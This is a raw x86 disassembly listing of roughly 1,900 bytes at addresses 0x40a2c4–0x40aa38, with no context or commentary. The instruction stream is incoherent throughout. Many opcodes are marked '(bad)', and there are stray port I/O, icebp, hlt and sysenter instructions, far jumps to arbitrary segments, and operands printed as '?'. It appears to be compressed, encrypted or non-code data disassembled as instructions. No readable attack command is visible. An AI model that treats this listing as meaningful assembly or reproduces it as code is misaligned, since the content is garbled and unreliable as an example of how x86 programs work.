  40a2c4:	cmp    BYTE PTR [edi+0x652445a5],cl
  40a2ca:	lahf   
  40a2cb:	jo     0x40a313
  40a2cd:	xor    eax,0xd81b1774
  40a2d2:	mov    al,ds:0x42ed92fa
  40a2d7:	retf   
  40a2d8:	sbb    ecx,DWORD PTR [ebx]
  40a2da:	sbb    eax,0xadadc6ba
  40a2df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e0:	loope  0x40a35e
  40a2e2:	fwait
  40a2e3:	(bad)  
  40a2e4:	in     al,0x20
  40a2e6:	out    0x7b,eax
  40a2e8:	mov    ds:0xee6f8012,eax
  40a2ed:	pop    ebp
  40a2ee:	dec    esp
  40a2ef:	in     al,0xe6
  40a2f1:	sar    DWORD PTR [ebp-0x44],cl
  40a2f4:	enter  0x3536,0xc9
  40a2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2f9:	(bad)  
  40a2fa:	icebp  
  40a2fb:	in     eax,dx
  40a2fc:	mov    al,0xdb
  40a2fe:	in     al,dx
  40a2ff:	or     DWORD PTR [ecx],edi
  40a301:	ja     0x40a2af
  40a303:	ds (bad) 
  40a305:	and    BYTE PTR [edi-0x2f9b88a5],ah
  40a30b:	sub    dl,bl
  40a30d:	lea    ebx,[edx]
  40a30f:	dec    edi
  40a310:	push   ecx
  40a311:	cs jmp 0x3c25:0x295f4f09
  40a319:	pop    edi
  40a31a:	adc    BYTE PTR [ebp-0x62],bh
  40a31d:	cmp    ah,cl
  40a31f:	es pushf 
  40a321:	cmp    DWORD PTR [ebp+0x32cd43c5],edx
  40a327:	jp     0x40a310
  40a329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a32a:	cmp    DWORD PTR [esi-0x505737cb],0x6d88cacc
  40a334:	jmp    0xe5ed769b
  40a339:	lods   eax,DWORD PTR ds:[esi]
  40a33a:	add    BYTE PTR [ebx+ebx*1-0x3f],bh
  40a33e:	shl    ecx,cl
  40a340:	sbb    BYTE PTR [ecx],ah
  40a342:	push   ss
  40a343:	or     BYTE PTR [eax-0x77],cl
  40a346:	cmp    DWORD PTR [esi-0x22efc88a],ebp
  40a34c:	cmp    esp,DWORD PTR [edi]
  40a34e:	add    BYTE PTR [esi+edx*4],bh
  40a351:	jmp    0x1bfa:0x64f04348
  40a358:	test   eax,0x2c20f3a2
  40a35d:	add    BYTE PTR [ebp+0x5ae8e4ae],dh
  40a363:	sub    edi,DWORD PTR [ebx-0x5e]
  40a366:	call   0x1a92d7b7
  40a36b:	(bad)  
  40a36c:	mov    cl,0xfe
  40a36e:	fs jb  0x40a2ff
  40a371:	adc    edx,DWORD PTR [ebx-0x3d062939]
  40a377:	(bad)  
  40a378:	sub    esi,DWORD PTR [ecx+0x2d]
  40a37b:	call   0x25a7:0x48f9d38f
  40a382:	or     DWORD PTR [edx-0x1e],ecx
  40a385:	sub    edi,ebx
  40a387:	lods   eax,DWORD PTR ds:[esi]
  40a388:	sub    eax,0x82ddd303
  40a38d:	fisubr DWORD PTR [eax]
  40a38f:	sar    BYTE PTR [ebp-0x24],1
  40a392:	xor    al,BYTE PTR [ecx]
  40a394:	mov    ecx,0x9405e59c
  40a399:	dec    BYTE PTR [eax+0x7ec2ae3c]
  40a39f:	sub    esp,DWORD PTR [ebx+0x567767cc]
  40a3a5:	mov    DWORD PTR [edx+0x42],esi
  40a3a8:	inc    esi
  40a3a9:	add    al,0x13
  40a3ab:	mov    al,0xa6
  40a3ad:	fs jg  0x40a3f2
  40a3b0:	cmp    BYTE PTR [edi],al
  40a3b2:	push   esi
  40a3b3:	dec    esi
  40a3b4:	jecxz  0x40a3fc
  40a3b6:	mov    ds,WORD PTR [eax]
  40a3b8:	(bad)  
  40a3b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3ba:	jbe    0x40a374
  40a3bc:	das    
  40a3bd:	pop    ebp
  40a3be:	dec    eax
  40a3bf:	aaa    
  40a3c0:	push   edi
  40a3c1:	jge    0x40a402
  40a3c3:	mov    eax,ds:0x248f650f
  40a3c8:	cmp    al,0xe3
  40a3ca:	jno    0x40a412
  40a3cc:	adc    bh,BYTE PTR [ecx+edx*8+0x76bac38e]
  40a3d3:	adc    DWORD PTR [eax+0x3d43bd6e],esp
  40a3d9:	int    0x60
  40a3db:	push   edx
  40a3dc:	aam    0x11
  40a3de:	pusha  
  40a3df:	int3   
  40a3e0:	dec    ecx
  40a3e1:	mov    edi,gs
  40a3e3:	mov    edi,0x845357f8
  40a3e8:	les    esi,FWORD PTR [ecx+edi*8]
  40a3eb:	mov    ah,0x83
  40a3ed:	mov    eax,0xe9e80838
  40a3f2:	push   esp
  40a3f3:	jge    0x40a399
  40a3f5:	ds mov eax,DWORD PTR ss:[edx-0xf0ad8ee]
  40a3fd:	dec    ebp
  40a3fe:	sahf   
  40a3ff:	cmp    BYTE PTR [eax+0x26],bh
  40a402:	enter  0xe31e,0x35
  40a406:	jmp    0x9bc5:0xa39395f2
  40a40d:	rcr    DWORD PTR [eax-0x35b45012],0x17
  40a414:	popf   
  40a415:	inc    ebp
  40a416:	out    0xc7,eax
  40a418:	icebp  
  40a419:	push   eax
  40a41a:	or     edi,DWORD PTR [edx+0x3dbdd1f5]
  40a420:	xor    edx,0x1a
  40a423:	ins    BYTE PTR es:[edi],dx
  40a424:	mov    eax,0xe563d5af
  40a429:	ror    DWORD PTR [edx],0x23
  40a42c:	dec    esp
  40a42d:	pop    ds
  40a42e:	loopne 0x40a436
  40a430:	adc    ah,bl
  40a432:	pusha  
  40a433:	mov    ch,0x4e
  40a435:	mov    esi,DWORD PTR [esp+edx*2]
  40a438:	mov    bl,0xd4
  40a43a:	push   ds
  40a43b:	cli    
  40a43c:	jo     0x40a3f6
  40a43e:	jmp    0xdeaf6f8c
  40a443:	mov    bh,0xe8
  40a445:	js     0x40a460
  40a447:	loope  0x40a3d9
  40a449:	aad    0xb1
  40a44b:	loop   0x40a3f8
  40a44d:	xchg   DWORD PTR [edx+0x2479d139],edi
  40a453:	xchg   ecx,eax
  40a454:	rcr    BYTE PTR [eax+0x5c47b8ee],1
  40a45a:	es cmp al,0x34
  40a45d:	pop    ds
  40a45e:	int3   
  40a45f:	rcl    BYTE PTR [ecx+0x5e],1
  40a462:	std    
  40a463:	sub    ecx,DWORD PTR [edx+0x7d8902c9]
  40a469:	mov    esp,0xee272221
  40a46e:	and    ebp,DWORD PTR [ebp-0x622cd842]
  40a474:	ins    DWORD PTR es:[edi],dx
  40a475:	in     al,dx
  40a476:	pop    ss
  40a477:	inc    ecx
  40a479:	stos   DWORD PTR es:[edi],eax
  40a47a:	daa    
  40a47b:	inc    eax
  40a47c:	ror    BYTE PTR [ebx],cl
  40a47e:	call   0x2c2b186c
  40a483:	fidivr WORD PTR [ebp+0x2e]
  40a486:	push   cs
  40a487:	sub    eax,0xa35f688d
  40a48c:	xor    al,0x1b
  40a48e:	mov    eax,0x51b95e3b
  40a493:	mov    bh,BYTE PTR [edi+esi*1+0x2b44addf]
  40a49a:	mov    ds:0x8c0bdfbb,al
  40a49f:	jns    0x40a4ec
  40a4a1:	les    ebp,FWORD PTR [esi+ebx*8-0x4126f7d9]
  40a4a8:	std    
  40a4a9:	sysenter 
  40a4ab:	arpl   WORD PTR [eax-0x1b3f132d],bx
  40a4b1:	sub    eax,DWORD PTR [ebx+0x4d044a09]
  40a4b7:	ds adc ebp,ebx
  40a4ba:	js     0x40a4d0
  40a4bc:	fstp   DWORD PTR [edi]
  40a4be:	ins    DWORD PTR es:[edi],dx
  40a4bf:	push   ds
  40a4c0:	cs (bad) 
  40a4c2:	ins    BYTE PTR es:[edi],dx
  40a4c3:	sub    edx,ebx
  40a4c5:	ss push eax
  40a4c7:	add    eax,0xe4b1a510
  40a4cc:	pop    edi
  40a4cd:	sbb    BYTE PTR [esi+edi*8],ah
  40a4d0:	nop
  40a4d1:	jle    0x40a4a6
  40a4d3:	fcom   DWORD PTR [edi-0x7d9407fd]
  40a4d9:	jp     0x40a482
  40a4db:	pop    esi
  40a4dc:	mov    esi,0x78383ba0
  40a4e1:	mov    eax,0x1f12d413
  40a4e6:	and    eax,0x1461746
  40a4eb:	and    edi,DWORD PTR [ebx]
  40a4ed:	xchg   esp,eax
  40a4ee:	sub    BYTE PTR [ecx+0x67fc80b6],cl
  40a4f4:	pusha  
  40a4f5:	xchg   esp,eax
  40a4f6:	ret    
  40a4f7:	sti    
  40a4f8:	hlt    
  40a4f9:	pop    ebx
  40a4fa:	clc    
  40a4fb:	or     bl,BYTE PTR [eax+edi*2+0xc95e850]
  40a502:	mov    eax,0x6636ec95
  40a507:	and    al,0x80
  40a509:	icebp  
  40a50a:	retf   
  40a50b:	mov    dh,0x42
  40a50d:	add    al,BYTE PTR [edi]
  40a50f:	outs   dx,DWORD PTR ds:[esi]
  40a510:	das    
  40a511:	call   0x5665f68f
  40a516:	pop    eax
  40a517:	scas   al,BYTE PTR es:[edi]
  40a518:	xchg   DWORD PTR [eax+eiz*8+0x14],ebp
  40a51c:	icebp  
  40a51d:	and    DWORD PTR [eax],esp
  40a51f:	mov    ?,WORD PTR ds:0xc58d309a
  40a525:	ret    0x30d
  40a528:	fild   DWORD PTR [edx+0x180f29b2]
  40a52e:	icebp  
  40a52f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a530:	pop    es
  40a531:	dec    esi
  40a532:	sub    DWORD PTR [edx],eax
  40a534:	fisttp DWORD PTR [ebp+0x55480ce]
  40a53a:	mov    esi,ebp
  40a53c:	lahf   
  40a53d:	push   esi
  40a53e:	ficom  WORD PTR [esi]
  40a540:	jne    0x40a567
  40a542:	adc    dl,BYTE PTR [ecx]
  40a544:	sbb    DWORD PTR [ecx-0x2963e7af],ecx
  40a54a:	inc    esp
  40a54b:	xor    dl,BYTE PTR [edi+ebp*2-0x2d]
  40a54f:	shl    BYTE PTR [esi-0x1fe8a5ce],0x3b
  40a556:	mov    ds:0x65e6976d,eax
  40a55b:	dec    edx
  40a55c:	hlt    
  40a55d:	push   esi
  40a55e:	jmp    0x1e042119
  40a563:	jbe    0x40a5ba
  40a565:	rcr    ebx,0xe4
  40a568:	adc    al,0x22
  40a56a:	mov    eax,0x6fa5baa3
  40a56f:	xchg   dl,bh
  40a571:	aad    0xa2
  40a573:	sahf   
  40a574:	popa   
  40a575:	inc    edi
  40a576:	xchg   edx,eax
  40a577:	out    0xbb,eax
  40a579:	int    0xf5
  40a57b:	xor    BYTE PTR [edi-0x63dc88d5],0xed
  40a582:	adc    eax,0x2081b79b
  40a587:	pop    eax
  40a588:	xlat   BYTE PTR ds:[ebx]
  40a589:	aam    0x9
  40a58b:	in     eax,0xbb
  40a58d:	mov    al,es:0x38620145
  40a593:	adc    al,BYTE PTR [edi+0x4156284c]
  40a599:	(bad)  
  40a59a:	mov    dl,0xaa
  40a59c:	not    BYTE PTR [esi+ecx*1]
  40a59f:	mov    eax,0xc1b0c109
  40a5a4:	inc    esp
  40a5a5:	inc    eax
  40a5a6:	fdiv   DWORD PTR [edi+edi*2-0x33]
  40a5aa:	rcr    BYTE PTR [ecx-0x11],0xf2
  40a5ae:	xor    esi,esp
  40a5b0:	dec    eax
  40a5b1:	xor    eax,0x77c24c3e
  40a5b6:	mov    edx,0x6bcf8d1c
  40a5bb:	inc    ecx
  40a5bc:	add    ebp,DWORD PTR [ecx-0x68]
  40a5bf:	xchg   ebx,eax
  40a5c0:	mov    eax,ds:0x65deaeae
  40a5c5:	sub    esi,esp
  40a5c7:	mov    eax,ds:0x54eed9ce
  40a5cc:	test   al,0xeb
  40a5ce:	out    0x7c,eax
  40a5d0:	in     al,0xe0
  40a5d2:	dec    ebp
  40a5d3:	add    edx,DWORD PTR [ecx]
  40a5d5:	and    al,0xf9
  40a5d7:	push   0xffffffa0
  40a5d9:	fisttp QWORD PTR [ecx]
  40a5db:	sbb    BYTE PTR [ebp+0x48],ch
  40a5de:	sbb    BYTE PTR [ebx+esi*8],al
  40a5e1:	xor    ebx,DWORD PTR [ebx]
  40a5e3:	push   cs
  40a5e4:	adc    cl,ah
  40a5e6:	enter  0x1f12,0x16
  40a5ea:	or     al,0x3c
  40a5ec:	cmp    dl,BYTE PTR [ebx+0x78]
  40a5ef:	das    
  40a5f0:	ss cmp eax,ebp
  40a5f3:	mov    ch,0x1f
  40a5f5:	adc    al,0x60
  40a5f7:	test   DWORD PTR fs:[edx+eiz*8],eax
  40a5fb:	xor    DWORD PTR [edx+ecx*1+0x2bcd02e6],0xf913ed1b
  40a606:	sahf   
  40a607:	xlat   BYTE PTR ds:[ebx]
  40a608:	jle    0x40a666
  40a60a:	push   ecx
  40a60b:	jbe    0x40a688
  40a60d:	push   edi
  40a60e:	xchg   edi,eax
  40a60f:	push   ecx
  40a610:	adc    bl,0xcb
  40a613:	cmp    BYTE PTR [ebx+0x46953350],ah
  40a619:	(bad)  
  40a61a:	stos   BYTE PTR es:[edi],al
  40a61b:	int    0xf
  40a61d:	mov    cl,0x27
  40a61f:	jbe    0x40a612
  40a621:	fisubr DWORD PTR [edx-0x2da9bf20]
  40a627:	lds    ebx,FWORD PTR [edx-0x2d]
  40a62a:	push   ds
  40a62b:	ret    0xb88c
  40a62e:	inc    edx
  40a62f:	and    eax,0x93bec2b7
  40a634:	mov    ds,WORD PTR [edi+edi*8-0x5d]
  40a638:	shl    BYTE PTR [esi-0xf2ff02f],cl
  40a63e:	and    ebx,edi
  40a640:	shl    BYTE PTR [eax],1
  40a642:	or     dl,BYTE PTR [ebx-0x4c4f8706]
  40a648:	push   esp
  40a649:	(bad)  
  40a64b:	call   0x352684d2
  40a650:	jae    0x40a679
  40a652:	loopne 0x40a6ae
  40a654:	xchg   BYTE PTR [eax*8-0x47f0dfee],dl
  40a65b:	cdq    
  40a65c:	adc    eax,0x1cec1c5c
  40a661:	add    eax,0xeed2f541
  40a666:	pop    eax
  40a667:	test   eax,0x92231176
  40a66c:	cmp    edi,ebx
  40a66e:	adc    bh,al
  40a670:	mov    BYTE PTR [ecx],cl
  40a672:	jecxz  0x40a6e1
  40a674:	icebp  
  40a675:	aad    0x66
  40a677:	sub    eax,0x8bbb4de3
  40a67c:	in     eax,0x1e
  40a67e:	jmp    0x40a626
  40a680:	into   
  40a681:	bswap  edx
  40a683:	fucomip st,st(2)
  40a685:	push   ds
  40a686:	ret    0xd2c4
  40a689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a68a:	pop    esp
  40a68b:	add    BYTE PTR [esi+ebp*4-0x5c367d4c],ch
  40a692:	imul   edi,DWORD PTR [edi+edi*8],0xffffff9c
  40a696:	popf   
  40a697:	jmp    0x40a6d4
  40a699:	cld    
  40a69a:	and    eax,DWORD PTR [eax]
  40a69c:	sbb    ecx,esi
  40a69e:	mov    ds:0x6edd46e5,al
  40a6a3:	aas    
  40a6a4:	or     eax,0x1340519d
  40a6a9:	or     ch,BYTE PTR [edx+edx*4]
  40a6ac:	push   ebx
  40a6ad:	pusha  
  40a6ae:	cwde   
  40a6af:	pushf  
  40a6b0:	retf   0xf514
  40a6b3:	imul   edx,DWORD PTR [eax],0xad873b4
  40a6b9:	add    ebx,DWORD PTR [edx-0x3a]
  40a6bc:	lea    esi,[edi]
  40a6be:	dec    ebp
  40a6bf:	fild   DWORD PTR [si-0x3f3b]
  40a6c4:	js     0x40a73b
  40a6c6:	daa    
  40a6c7:	xlat   BYTE PTR ds:[ebx]
  40a6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6c9:	ffree  st(1)
  40a6cb:	int3   
  40a6cc:	sub    ebx,DWORD PTR gs:[esi-0x2e]
  40a6d0:	and    ch,BYTE PTR [edx]
  40a6d2:	xlat   BYTE PTR ds:[ebx]
  40a6d3:	sbb    DWORD PTR [edi-0x79ea396e],edx
  40a6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6da:	sbb    al,0x8d
  40a6dc:	lds    ebp,FWORD PTR [edi]
  40a6de:	sbb    BYTE PTR [esi+0x36447c6b],dl
  40a6e4:	sub    al,ah
  40a6e6:	jl     0x40a6f6
  40a6e8:	mov    dl,ch
  40a6ea:	pop    edx
  40a6eb:	mov    ds:0xea80e707,eax
  40a6f0:	jb     0x40a691
  40a6f2:	xchg   DWORD PTR [edi+esi*8-0x238756ef],edx
  40a6f9:	xchg   ebp,eax
  40a6fa:	jnp    0x40a757
  40a6fc:	lods   eax,DWORD PTR ds:[esi]
  40a6fd:	mov    ds,WORD PTR [ebp+0x642465e1]
  40a703:	pop    edi
  40a704:	inc    esi
  40a705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a706:	adc    al,cl
  40a708:	test   eax,0x9be73906
  40a70d:	xchg   ecx,eax
  40a70e:	inc    ebp
  40a70f:	enter  0x5459,0xf5
  40a713:	sbb    bl,BYTE PTR [esi-0x12]
  40a716:	imul   esp,DWORD PTR [eax],0x60
  40a719:	mov    WORD PTR [esi-0x425bc47a],cs
  40a71f:	dec    ebp
  40a720:	imul   eax,esi,0x5f12a8ba
  40a726:	inc    esp
  40a727:	dec    edx
  40a728:	test   al,0x17
  40a72a:	jmp    0x40a73d
  40a72c:	sahf   
  40a72d:	aas    
  40a72e:	fadd   DWORD PTR [edi]
  40a730:	xor    al,0x3f
  40a732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a733:	push   ebp
  40a734:	idiv   ch
  40a736:	pop    esp
  40a737:	jg     0x40a7a0
  40a739:	popf   
  40a73a:	pop    es
  40a73b:	and    ch,BYTE PTR [ebp-0x2d]
  40a73e:	sbb    al,0x52
  40a740:	inc    edi
  40a741:	lds    ecx,FWORD PTR [eax-0x30]
  40a744:	jmp    0x40a79a
  40a746:	scas   eax,DWORD PTR es:[edi]
  40a747:	fucomip st,st(7)
  40a749:	in     eax,dx
  40a74a:	or     cl,BYTE PTR [ecx]
  40a74c:	sbb    DWORD PTR [ecx-0x65],ebp
  40a74f:	add    DWORD PTR [esi-0x6833d649],esi
  40a755:	and    DWORD PTR [ecx],edx
  40a757:	adc    eax,0x89913864
  40a75c:	add    ch,ah
  40a75e:	fbstp  TBYTE PTR [ebx+0x70]
  40a761:	loope  0x40a773
  40a763:	into   
  40a764:	fwait
  40a765:	cmp    bl,0x43
  40a768:	test   DWORD PTR [eax+edx*2-0x7b445617],0x6e04014d
  40a773:	xor    eax,eax
  40a775:	mov    gs,WORD PTR [ebx]
  40a777:	cmp    BYTE PTR [ecx-0x3f8e018b],ch
  40a77d:	aad    0xcc
  40a77f:	jmp    0x40a74f
  40a781:	inc    ebx
  40a782:	mov    bl,0x94
  40a784:	xor    al,0x6c
  40a786:	mov    esp,DWORD PTR [edx+0x45f6af11]
  40a78c:	fsubr  DWORD PTR [ebp+0x4bba2643]
  40a792:	jmp    DWORD PTR [ecx-0x1f]
  40a795:	popf   
  40a796:	mov    esp,0xf47556f9
  40a79b:	aas    
  40a79c:	mov    dl,0x85
  40a79e:	xchg   edi,eax
  40a79f:	mov    ecx,0x4de338a8
  40a7a4:	out    0x18,eax
  40a7a6:	repz pop edx
  40a7a8:	mov    esi,0x562d8781
  40a7ad:	xchg   esi,eax
  40a7ae:	jns    0x40a771
  40a7b0:	sbb    BYTE PTR [edi],al
  40a7b2:	xchg   edi,eax
  40a7b3:	push   ebx
  40a7b4:	add    DWORD PTR [edi-0x14],0xffffffbc
  40a7b8:	leave  
  40a7b9:	pop    ss
  40a7ba:	repz jmp 0x40a73f
  40a7bd:	stos   DWORD PTR es:[edi],eax
  40a7be:	das    
  40a7bf:	fild   QWORD PTR [edx]
  40a7c1:	js     0x40a7cd
  40a7c3:	xor    dl,BYTE PTR [edx+edx*1]
  40a7c6:	sbb    BYTE PTR [eax+0x3965a03c],cl
  40a7cc:	and    edx,DWORD PTR [edx]
  40a7ce:	push   ebx
  40a7cf:	jne    0x40a7f4
  40a7d1:	js     0x40a754
  40a7d3:	pop    edx
  40a7d4:	xchg   ecx,eax
  40a7d5:	xchg   edx,eax
  40a7d6:	(bad)  
  40a7d7:	mov    ds:0xa739a609,al
  40a7dc:	rcl    cl,1
  40a7de:	imul   eax,DWORD PTR [edx+0x67],0x70
  40a7e2:	cmp    ch,BYTE PTR [eax+esi*8]
  40a7e5:	pushf  
  40a7e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7e7:	sbb    DWORD PTR ds:0x7a2a33c4,esi
  40a7ed:	jecxz  0x40a82c
  40a7ef:	hlt    
  40a7f0:	mov    al,ss:0x360d6d7c
  40a7f6:	mov    dl,0xd
  40a7f8:	adc    DWORD PTR [edx+0xbd818b8],eax
  40a7fe:	scas   eax,DWORD PTR es:[edi]
  40a7ff:	adc    ch,BYTE PTR [edx-0x43]
  40a802:	adc    al,0xc0
  40a804:	shl    DWORD PTR [edx-0xe],1
  40a807:	js     0x40a830
  40a809:	div    BYTE PTR [eax]
  40a80b:	test   eax,0x5a4d1bc1
  40a810:	mov    ah,0x2e
  40a812:	repnz mov eax,0xb192c41e
  40a818:	xlat   BYTE PTR ds:[ebx]
  40a819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a81a:	bound  esp,QWORD PTR [ecx-0x60]
  40a81d:	mov    ebx,0xa14aaf22
  40a822:	(bad)
  40a825:	jbe    0x40a85b
  40a827:	or     ebp,DWORD PTR [edi-0x50d3cdb7]
  40a82d:	or     BYTE PTR [ecx-0x5d],ch
  40a830:	leave  
  40a831:	or     DWORD PTR [ebp-0x77],esp
  40a834:	fsub   DWORD PTR [ecx-0x763d0328]
  40a83a:	mov    bl,ah
  40a83c:	mov    ebp,0x5d124cee
  40a841:	inc    esi
  40a842:	and    DWORD PTR [edi-0x294f857b],edi
  40a848:	sti    
  40a849:	fild   DWORD PTR [edx+0x13de68e1]
  40a84f:	xor    edi,esi
  40a851:	and    al,0x83
  40a853:	in     eax,0x5e
  40a855:	outs   dx,DWORD PTR ds:[esi]
  40a856:	(bad)  
  40a857:	iret   
  40a858:	lock lods eax,DWORD PTR ds:[esi]
  40a85a:	out    dx,eax
  40a85b:	(bad)  
  40a85c:	ins    DWORD PTR es:[edi],dx
  40a85d:	fisubr WORD PTR [ecx]
  40a85f:	dec    ecx
  40a860:	jb     0x40a800
  40a862:	adc    eax,0x5ce2585d
  40a867:	and    DWORD PTR [ebx],eax
  40a869:	mov    ch,0xae
  40a86b:	outs   dx,DWORD PTR fs:[esi]
  40a86d:	xchg   esi,eax
  40a86e:	out    0xe5,al
  40a870:	int    0x7e
  40a872:	leave  
  40a873:	mov    dl,0xdc
  40a875:	xchg   BYTE PTR [esi-0x71],dl
  40a878:	mov    esp,0xa45f923c
  40a87d:	mov    al,ds:0xe51a9116
  40a882:	lahf   
  40a883:	jp     0x40a810
  40a885:	ins    DWORD PTR es:[edi],dx
  40a886:	sub    DWORD PTR [edx-0x3c],ebx
  40a889:	iret   
  40a88a:	jle    0x40a866
  40a88c:	rol    BYTE PTR gs:[eax],cl
  40a88f:	adc    ebx,DWORD PTR [eax+ecx*2]
  40a892:	fstp   DWORD PTR ds:0x26908e11
  40a898:	outs   dx,BYTE PTR ds:[esi]
  40a899:	lds    esi,FWORD PTR [edx-0x676cacfc]
  40a89f:	cmp    esi,esi
  40a8a1:	push   edx
  40a8a2:	sub    DWORD PTR [ebx-0x32ae4374],0xffffff82
  40a8a9:	xchg   edi,eax
  40a8aa:	mov    ebp,0x9392a5b0
  40a8af:	xchg   BYTE PTR [esi],ah
  40a8b1:	mov    esp,?
  40a8b3:	andnps xmm6,XMMWORD PTR [ebx-0x13]
  40a8b7:	test   eax,0x739180dc
  40a8bc:	mov    eax,gs
  40a8be:	fld    DWORD PTR [eax-0x34]
  40a8c1:	push   esp
  40a8c2:	adc    ch,BYTE PTR [ebp+ecx*8-0x35]
  40a8c6:	enter  0x6319,0xd3
  40a8ca:	aas    
  40a8cb:	shl    BYTE PTR [ecx-0x67],0xdb
  40a8cf:	imul   esi,DWORD PTR [esi],0xd7a29224
  40a8d5:	push   edi
  40a8d6:	or     al,0x42
  40a8d8:	push   es
  40a8d9:	sbb    edx,DWORD PTR [edi-0x6f]
  40a8dc:	das    
  40a8dd:	lods   eax,DWORD PTR ds:[esi]
  40a8de:	aad    0x76
  40a8e0:	inc    eax
  40a8e1:	sub    eax,0xae044d2b
  40a8e6:	in     eax,dx
  40a8e7:	sar    bh,cl
  40a8e9:	mov    al,ds:0x6976149f
  40a8ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8ef:	xchg   al,bl
  40a8f1:	mov    edx,0x3e9a4421
  40a8f6:	jo     0x40a8cc
  40a8f8:	in     eax,dx
  40a8f9:	stos   BYTE PTR es:[edi],al
  40a8fa:	add    DWORD PTR [edx-0x65],eax
  40a8fd:	xchg   ebx,eax
  40a8fe:	out    0xba,al
  40a900:	push   0xa4ec625
  40a905:	rol    BYTE PTR [edi-0x1d],cl
  40a908:	fsubr  QWORD PTR [eax+0x3e]
  40a90b:	inc    esp
  40a90c:	xor    eax,0xefb1137b
  40a911:	cmp    ebp,DWORD PTR [edi-0x1460f994]
  40a917:	in     eax,dx
  40a918:	jbe    0x40a903
  40a91a:	adc    eax,0x7d1f91ea
  40a91f:	dec    edx
  40a920:	cmp    bl,ah
  40a922:	adc    DWORD PTR [edx-0x7a393193],0xffffff81
  40a929:	or     al,0xfc
  40a92b:	and    cl,dl
  40a92d:	bswap  ecx
  40a92f:	jecxz  0x40a8e8
  40a931:	dec    eax
  40a932:	shl    eax,cl
  40a934:	ds popa 
  40a936:	add    bl,dl
  40a938:	inc    eax
  40a939:	loope  0x40a8e8
  40a93b:	fdiv   DWORD PTR [ecx+esi*1]
  40a93e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a93f:	jmp    0x93fe2400
  40a944:	das    
  40a945:	outs   dx,DWORD PTR ds:[esi]
  40a946:	fdiv   QWORD PTR [ebx+0x40a62076]
  40a94c:	mov    ds:0xd807c95,eax
  40a951:	cld    
  40a952:	jae    0x40a991
  40a954:	push   esp
  40a955:	ins    BYTE PTR es:[edi],dx
  40a956:	rcl    DWORD PTR [edx-0x43212c3f],0xd3
  40a95d:	comiss xmm6,DWORD PTR [edx]
  40a960:	(bad)  
  40a961:	pop    eax
  40a962:	xor    DWORD PTR [ebx],esi
  40a964:	xchg   ecx,eax
  40a965:	add    DWORD PTR [ebx-0x57],eax
  40a968:	mov    esi,0xa62d21dc
  40a96d:	and    eax,0x3bcd0197
  40a972:	in     eax,dx
  40a973:	push   cs
  40a974:	lods   eax,DWORD PTR ds:[esi]
  40a975:	dec    edi
  40a976:	mov    bh,0x8e
  40a978:	dec    ebp
  40a979:	dec    esp
  40a97a:	xor    ch,BYTE PTR [edi]
  40a97c:	mov    ah,0x74
  40a97e:	pop    es
  40a97f:	sti    
  40a980:	dec    edi
  40a981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a982:	popa   
  40a983:	push   ecx
  40a984:	fist   DWORD PTR [esi+0x0]
  40a987:	mov    ?,edi
  40a989:	and    BYTE PTR [edi+0x5],cl
  40a98c:	rcl    ebp,1
  40a98e:	xor    bl,bl
  40a990:	xchg   BYTE PTR [ebx-0x6d322fe1],cl
  40a996:	add    al,0xe
  40a998:	xor    eax,0x86685dab
  40a99d:	scas   eax,DWORD PTR es:[edi]
  40a99e:	jecxz  0x40a9db
  40a9a0:	adc    al,0xe2
  40a9a2:	sub    dh,BYTE PTR [edi-0x9b7ba55]
  40a9a8:	or     bl,BYTE PTR [edx+0x2386c73f]
  40a9ae:	mov    bh,BYTE PTR [edx]
  40a9b0:	lods   eax,DWORD PTR ds:[esi]
  40a9b1:	push   ebp
  40a9b2:	leave  
  40a9b3:	dec    esi
  40a9b4:	ret    
  40a9b5:	inc    edi
  40a9b6:	das    
  40a9b7:	bound  esi,QWORD PTR [edi]
  40a9b9:	xchg   ebp,eax
  40a9ba:	push   ebx
  40a9bb:	in     al,dx
  40a9bc:	shl    BYTE PTR [edi+0x5a27c8e9],cl
  40a9c2:	retf   0xb0e7
  40a9c5:	aas    
  40a9c6:	xor    al,0x42
  40a9c8:	cmp    BYTE PTR [ecx-0x6d],0x87
  40a9cc:	push   edi
  40a9cd:	add    DWORD PTR [esi],0x63
  40a9d0:	or     DWORD PTR [esi-0x6d],esp
  40a9d3:	rcl    DWORD PTR [ecx+0x2b],cl
  40a9d6:	dec    DWORD PTR [eax+0x58d1c774]
  40a9dc:	mov    ecx,0x7f6ba1ae
  40a9e1:	shl    ah,1
  40a9e3:	test   BYTE PTR [ecx-0x3d],dh
  40a9e6:	out    dx,al
  40a9e7:	jno    0x40a9aa
  40a9e9:	mov    ch,0x2
  40a9eb:	pop    ebx
  40a9ec:	sbb    BYTE PTR [eax+eax*4+0x67],0x65
  40a9f1:	popf   
  40a9f2:	and    BYTE PTR [ebp-0x7d19d6c7],dl
  40a9f8:	cmp    DWORD PTR [edx],edi
  40a9fa:	je     0x40a9da
  40a9fc:	mov    bl,0x95
  40a9fe:	cmp    eax,edx
  40aa00:	pop    ds
  40aa01:	mov    ebx,0xf389c759
  40aa06:	xchg   ebp,eax
  40aa07:	test   eax,0x8cf1efe9
  40aa0c:	and    DWORD PTR [edi-0x6d61f6f7],esp
  40aa12:	test   BYTE PTR fs:0x46b96023,al
  40aa19:	loope  0x40aa35
  40aa1b:	xchg   ebp,eax
  40aa1c:	call   0x9951:0x71ec7ee3
  40aa23:	mov    esp,0x56805584
  40aa28:	lock xor eax,0x6b4c0b80
  40aa2e:	fdiv   QWORD PTR [ecx+eax*8+0x1eb1ed1d]
  40aa35:	xchg   edx,eax
  40aa36:	nop
  40aa37:	pop    ds
  40aa38:	sahf   
